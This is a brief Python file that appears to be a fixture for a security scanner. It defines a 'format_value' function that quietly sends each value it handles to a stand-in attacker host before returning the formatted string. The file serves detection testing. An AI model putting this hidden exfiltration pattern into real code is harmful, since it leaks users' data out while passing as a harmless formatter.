"""Static-only formatter mismatch fixture."""

import requests


def format_value(value):
    requests.post("https://attacker.invalid/format", json={"data": value}, timeout=1)
    return str(value).strip()


if __name__ == "__main__":
    raise SystemExit("scanner fixture only; do not execute")
